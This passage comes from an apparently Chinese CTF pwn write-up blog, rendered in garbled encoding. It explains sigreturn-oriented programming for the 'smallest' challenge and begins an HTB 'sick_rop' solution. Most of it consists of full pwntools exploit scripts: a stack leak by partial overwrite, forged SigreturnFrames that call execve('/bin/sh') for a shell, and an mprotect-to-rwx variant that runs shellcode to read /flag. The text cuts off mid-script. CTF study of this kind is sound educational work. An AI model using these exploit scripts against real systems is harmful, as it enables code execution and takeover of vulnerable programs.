id="smallestï¼ˆé€šè¿‡-read-å­—èŠ‚æ•°æ„é€ çš„-Sigreturnï¼‰"><a class="header-anchor" href="#smallestï¼ˆé€šè¿‡-read-å­—èŠ‚æ•°æ„é€ çš„-Sigreturnï¼‰">Â¶</a>smallestï¼ˆé€šè¿‡ read å­—èŠ‚æ•°æ„é€ çš„ Sigreturnï¼‰</h3><h4 id="åˆ†æ-v3"><a class="header-anchor" href="#åˆ†æ-v3">Â¶</a>åˆ†æ</h4><p>ç¨‹åºè¶Šæ¥è¶ŠçŸ­ï¼Œgaget è¶Šæ¥è¶Šå°‘ QWQã€‚è¿™ä¸ªç›¸å½“ç›´æ¥ï¼Œåœ¨ rsp å†™å¤„å†™ <code>0x400</code> çš„æ•°æ®ï¼Œå‰©ä¸‹çš„çˆ±å’‹å’‹åœ°ã€‚</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220329152145281.png" alt="image-20220329152145281"></p><p>å¹¶ä¸”è¿™é¢˜åœ¨è¿è¡Œæ—¶å¹¶æ²¡æœ‰ä¸€ä¸ªè¾ƒä¸ºå›ºå®šçš„å¯è¯»å¯å†™åœ°å€ï¼Œéœ€è¦ leak æ ˆåœ°å€ã€‚</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220329161716980.png" alt="image-20220329161716980"></p><p><strong>å…³é”®ç‚¹ï¼šx64 è°ƒç”¨çº¦å®šä¸­è¯´æ˜äº†å‡½æ•°è°ƒç”¨çš„è¿”å›å€¼æ˜¯å­˜åœ¨ rax é‡Œé¢çš„ï¼Œè€Œ <code>SYS_read</code> è¿”å›å€¼æ˜¯è¯»å–çš„å­—èŠ‚ä¸ªæ•°ã€‚</strong></p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">+â”€â”€â”€â”€â”€â”€â”€+â”€â”€â”€â”€â”€â”€â”€+â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€+â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€+<br>|<span class="hljs-string"> %rax  </span>|<span class="hljs-string"> Name  </span>|<span class="hljs-string"> Entry point  </span>|<span class="hljs-string"> Implementation   </span>|<br>+â”€â”€â”€â”€â”€â”€â”€+â”€â”€â”€â”€â”€â”€â”€+â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€+â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€+<br>|<span class="hljs-string"> 0     </span>|<span class="hljs-string"> read  </span>|<span class="hljs-string"> sys_read     </span>|<span class="hljs-string"> fs/read_write.c  </span>|<br>|<span class="hljs-string"> 1     </span>|<span class="hljs-string"> write </span>|<span class="hljs-string"> sys_write    </span>|<span class="hljs-string"> fs/read_write.c  </span>|<br>+â”€â”€â”€â”€â”€â”€â”€+â”€â”€â”€â”€â”€â”€â”€+â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€+â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€+<br></code></pre></td></tr></table></figure><p>è€Œæˆ‘ä»¬å‘ç° write çš„è°ƒç”¨å·æ˜¯ 1 ï¼Œæ„æ€æ˜¯æˆ‘ä»¬åœ¨è¯»å…¥ä¸€ä¸ªå­—èŠ‚çš„æƒ…å†µä¸‹è·³è¿‡ <code>xor rax,rax</code> è¿™ä¸€æ­¥å°±ä¼š write å‡º rspã€‚</p><ol><li><p>ç¬¬ä¸€æ¬¡æ‰§è¡Œå…ˆ read å¡å…¥ä¸‰ä¸ª <code>vuln_addr = 0x4000B0</code>ï¼Œæ§åˆ¶ç¨‹åºæµç¨‹ï¼Œæ¯ä¸€æ¬¡ ret éƒ½æ‰§è¡Œä¸€æ¬¡ vulnã€‚</p></li><li><p>ç¬¬äºŒæ¬¡æ‰§è¡Œä»… read å¡å…¥ä¸€ä¸ªå­—èŠ‚ï¼Œéƒ¨åˆ†è¦†ç›–æ‰è¿”å›åœ°å€ä¸º <code>NOxor_vuln = 0x4000B3</code> ã€‚</p></li><li><p>ç¬¬ä¸‰æ¬¡æ‰§è¡Œï¼Œç”±äº write <strong>ä¸å—</strong> <code>\x00</code> æˆªæ–­å½±å“ï¼Œåˆ° syscall æ—¶å°±ä¼šä» rsp æŒ‡é’ˆå¤„å¼€å§‹ leak å‡ºæ­¤æ—¶çš„æ ˆä¿¡æ¯ï¼ˆæ³¨æ„ä¸æ˜¯ rsp æŒ‡é’ˆåœ°å€ï¼Œä½†æ˜¯ä¼šè¾“å‡ºå¾ˆå¤šæ ˆå†…çš„åœ°å€ï¼‰ã€‚</p></li><li><p>ç¬¬å››æ¬¡æ‰§è¡Œï¼Œread å¡å…¥ <code>vuln_addr</code> ä»¥åŠ Frameã€‚</p></li><li><p>ç¬¬äº”æ¬¡æ‰§è¡Œï¼Œread å¡å…¥ <code>syscall;ret</code>  åœ°å€ä»¥åŠ Frame å‰ 7 ä¸ªå­—èŠ‚ï¼ˆå‡‘é½ <code>RAX = 15</code>ï¼‰ã€‚</p></li><li><p>åˆ°è¿™å°±å’Œä¸Šé¢˜å·®ä¸å¤šäº†ï¼Œç¬¬ä¸€ä¸ª Frame è¯»å…¥ ROP é“¾ï¼Œç¬¬äºŒä¸ª Frame æ‰§è¡Œ <code>/bin/sh\0</code>ã€‚ä¸è¿‡ ROP æ„é€ è¿˜æ˜¯è¦å…ˆè¯»å…¥ä¸€æ¬¡ï¼Œåç»­å‡‘æ»¡ 15 å­—èŠ‚è¿™æ ·åˆ©ç”¨ã€‚ç†Ÿæ‚‰æµç¨‹åéš¾åº¦ä¸å¤§ã€‚</p></li></ol><h4 id="Exp-execve"><a class="header-anchor" href="#Exp-execve">Â¶</a>Exp(execve)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :p.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    glibc_dir = <span class="hljs-string">&#x27;~/Exps/Glibc/glibc-2.27/&#x27;</span><br>    gdbscript = <span class="hljs-string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdio-common/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir<br>    elf_base = <span class="hljs-built_in">int</span>(os.popen(<span class="hljs-string">&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print \x241&#125;&#125;\x27&#x27;</span>.<span class="hljs-built_in">format</span>(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> elf.pie <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdb.attach(p, gdbscript)<br>    time.sleep(<span class="hljs-number">1</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./smallest&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>])<br>p = process(<span class="hljs-string">&#x27;./smallest&#x27;</span>)<br><span class="hljs-comment"># debug()</span><br><span class="hljs-comment"># p = remote(&#x27;node4.buuoj.cn&#x27;,26278)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">.text:00000000004000B0                 xor     rax, rax</span><br><span class="hljs-string">.text:00000000004000B3                 mov     edx, 400h       ; count</span><br><span class="hljs-string">.text:00000000004000B8                 mov     rsi, rsp        ; buf</span><br><span class="hljs-string">.text:00000000004000BB                 mov     rdi, rax        ; fd</span><br><span class="hljs-string">.text:00000000004000BE                 syscall                 ; LINUX - sys_read</span><br><span class="hljs-string">.text:00000000004000C0                 retn</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>vuln_addr = <span class="hljs-number">0x4000B0</span><br>NOxor_vuln = <span class="hljs-number">0x4000B3</span><br>syscall_ret = <span class="hljs-number">0x4000BE</span><br>fuck = SigreturnFrame()<br>fuck.rax = <span class="hljs-number">0</span><br>fuck.rdi = <span class="hljs-number">0</span><br><br>payload=flat(<br>    [vuln_addr,vuln_addr,vuln_addr]<br>)<br>se(payload)<br>se(<span class="hljs-string">&#x27;\xB3&#x27;</span>)<br>rc(<span class="hljs-number">8</span>)<br>stack_addr = uu64(rc(<span class="hljs-number">8</span>))<br>stack_addr = stack_addr&gt;&gt;<span class="hljs-number">4</span><br>stack_addr = stack_addr&lt;&lt;<span class="hljs-number">4</span><br>info_addr(<span class="hljs-string">&#x27;stack&#x27;</span>,stack_addr)<br>fuck = SigreturnFrame()<br>fuck.rax = <span class="hljs-number">0</span><br>fuck.rdi = <span class="hljs-number">0</span><br>fuck.rsi = stack_addr<br>fuck.rdx = <span class="hljs-number">0x400</span><br>fuck.rsp = stack_addr<br>fuck.rip = syscall_ret<br><br>payload=flat(<br>    [vuln_addr,<span class="hljs-number">0</span>,fuck]<br>)<br>se(payload)<br>se(p64(NOxor_vuln)+<span class="hljs-built_in">str</span>(fuck)[:<span class="hljs-number">7</span>])<br>wsnd = SigreturnFrame()<br>wsnd.rax = <span class="hljs-number">59</span><br>wsnd.rdi = stack_addr + <span class="hljs-number">0x200</span><br>wsnd.rsi = <span class="hljs-number">0</span><br>wsnd.rdx = <span class="hljs-number">0</span><br>wsnd.rsp = stack_addr<br>wsnd.rip = syscall_ret<br>payload=(p64(vuln_addr)+p64(<span class="hljs-number">0</span>)+<span class="hljs-built_in">str</span>(wsnd)).ljust(<span class="hljs-number">0x200</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-string">&#x27;/bin/sh\0&#x27;</span><br>se(payload)<br>se(p64(NOxor_vuln)+<span class="hljs-built_in">str</span>(wsnd)[:<span class="hljs-number">7</span>])<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h4 id="Exp-orw"><a class="header-anchor" href="#Exp-orw">Â¶</a>Exp(orw)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :p.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    glibc_dir = <span class="hljs-string">&#x27;~/Exps/Glibc/glibc-2.27/&#x27;</span><br>    gdbscript = <span class="hljs-string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdio-common/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir<br>    elf_base = <span class="hljs-built_in">int</span>(os.popen(<span class="hljs-string">&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print \x241&#125;&#125;\x27&#x27;</span>.<span class="hljs-built_in">format</span>(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> elf.pie <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdb.attach(p, gdbscript)<br>    time.sleep(<span class="hljs-number">1</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./smallest&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>])<br><span class="hljs-comment"># p = process(&#x27;./smallest&#x27;)</span><br><span class="hljs-comment"># debug()</span><br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">26278</span>)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">.text:00000000004000B0                 xor     rax, rax</span><br><span class="hljs-string">.text:00000000004000B3                 mov     edx, 400h       ; count</span><br><span class="hljs-string">.text:00000000004000B8                 mov     rsi, rsp        ; buf</span><br><span class="hljs-string">.text:00000000004000BB                 mov     rdi, rax        ; fd</span><br><span class="hljs-string">.text:00000000004000BE                 syscall                 ; LINUX - sys_read</span><br><span class="hljs-string">.text:00000000004000C0                 retn</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>vuln_addr = <span class="hljs-number">0x4000B0</span><br>NOxor_vuln = <span class="hljs-number">0x4000B3</span><br>syscall_ret = <span class="hljs-number">0x4000BE</span><br>fuck = SigreturnFrame()<br>fuck.rax = <span class="hljs-number">0</span><br>fuck.rdi = <span class="hljs-number">0</span><br><br>payload=flat(<br>    [vuln_addr,vuln_addr,vuln_addr]<br>)<br>se(payload)<br>se(<span class="hljs-string">&#x27;\xB3&#x27;</span>)<br>rc(<span class="hljs-number">8</span>)<br>stack_addr = uu64(rc(<span class="hljs-number">8</span>))<br>stack_addr = stack_addr&gt;&gt;<span class="hljs-number">4</span><br>stack_addr = stack_addr&lt;&lt;<span class="hljs-number">4</span><br>info_addr(<span class="hljs-string">&#x27;stack&#x27;</span>,stack_addr)<br>fuck = SigreturnFrame()<br>fuck.rax = <span class="hljs-number">0</span><br>fuck.rdi = <span class="hljs-number">0</span><br>fuck.rsi = stack_addr<br>fuck.rdx = <span class="hljs-number">0x400</span><br>fuck.rsp = stack_addr<br>fuck.rip = syscall_ret<br><br>payload=flat(<br>    [vuln_addr,<span class="hljs-number">0</span>,fuck]<br>)<br>se(payload)<br>se(p64(NOxor_vuln)+<span class="hljs-built_in">str</span>(fuck)[:<span class="hljs-number">7</span>])<br>wsnd = SigreturnFrame()<br>wsnd.rax = <span class="hljs-number">10</span><br>wsnd.rdi = (stack_addr&gt;&gt;<span class="hljs-number">12</span>)&lt;&lt;<span class="hljs-number">12</span><br>wsnd.rsi = <span class="hljs-number">0x1000</span><br>wsnd.rdx = <span class="hljs-number">7</span><br>wsnd.rsp = stack_addr<br>wsnd.rip = syscall_ret<br>payload=(p64(vuln_addr)+p64(<span class="hljs-number">0</span>)+<span class="hljs-built_in">str</span>(wsnd)).ljust(<span class="hljs-number">0x200</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-built_in">str</span>(asm(shellcraft.cat(<span class="hljs-string">&#x27;/flag&#x27;</span>)))<br>se(payload)<br>se(p64(NOxor_vuln)+<span class="hljs-built_in">str</span>(wsnd)[:<span class="hljs-number">7</span>])<br><br>se(p64(stack_addr+<span class="hljs-number">0x200</span>))<br><br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>å˜é‡åæ˜¯ä¸æ˜¯å¾ˆå¸…ï¼Œæ²¡å•¥ç”¨ï¼Œå°±æœ¬åœ°æ‰“é€šï¼Œ ğŸ’¨ è¿œç¨‹ä¸€ä¸ªéƒ½æ‰“ä¸é€šï¼Œrun äº† run äº†ã€‚</p><hr><p><em><strong>2022/5/4 0:18 è¡¥å……</strong></em>ï¼š<strong>SROP åœ¨æ²¡åœ°æ–¹è½è„šï¼ˆæŒ‡å†™ rsp æˆ–è€… rip çš„æ—¶å€™ï¼‰ï¼Œä¸€å®šè®°å¾— vmmap ä¹‹å <code>x/100xg</code> æŸ¥çœ‹ä¸€ä¸‹ä»£ç æ®µæœ‰æ—  text æ®µæŒ‡é’ˆå¯ä»¥å½“è·³æ¿ã€‚</strong></p><h3 id="HTB-sick-ropï¼ˆæ‰¬-text-æ®µï¼‰"><a class="header-anchor" href="#HTB-sick-ropï¼ˆæ‰¬-text-æ®µï¼‰">Â¶</a>HTB - sick_ropï¼ˆæ‰¬ text æ®µï¼‰</h3><p>ç”±äºç½‘ç»œåŸå› è¿œç¨‹æ²¡æ‰“é€šï¼Œç½¢ ğŸ¦ ã€‚ä¸»è¦æ˜¯åˆ©ç”¨ä»£ç æ®µæ®‹ç•™çš„æŒ‡é’ˆï¼Œè¿™é‡Œå¯ä»¥å†™ä¿©æ¬¡ SROP æ‰§è¡Œ <code>/bin/sh\0</code> getshellã€‚</p><p>ä½†æ˜¯å†™ <code>mprotect</code> å…¶å®çœŸçš„åªç”¨å†™ä¸€æ¬¡ç„¶åæ”¹ rip å°±è¡Œäº†ã€‚å› ä¸ºæ²¡æœ‰å…¶ä»–çš„åœ°å€å¯ä»¥è½è„šï¼Œç›´æ¥æŠŠ<strong>æ•´ä¸ªä»£ç æ®µæ‰¬æˆ <code>rwx</code> å°±å¥½äº†</strong>QwQã€‚éå¸¸æ»´ç‹‚é‡å¿«ä¹ crazy ä¸è®²é“ç†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :p.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    glibc_dir = <span class="hljs-string">&#x27;~/Exps/Glibc/glibc-2.27/&#x27;</span><br>    gdbscript = <span class="hljs-string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdio-common/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir<br>    elf_base = <span class="hljs-built_in">int</span>(os.popen(<span class="hljs-string">&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print \x241&#125;&#125;\x27&#x27;</span>.<span class="hljs-built_in">format</span>(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> elf.pie <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdb.attach(p, gdbscript)<br>    time.sleep(<span class="hljs-number">1</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./sick_rop&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>])<br>p = process(<span class="hljs-string">&#x27;./sick_rop&#x27;</span>)<br>debug()<br><span 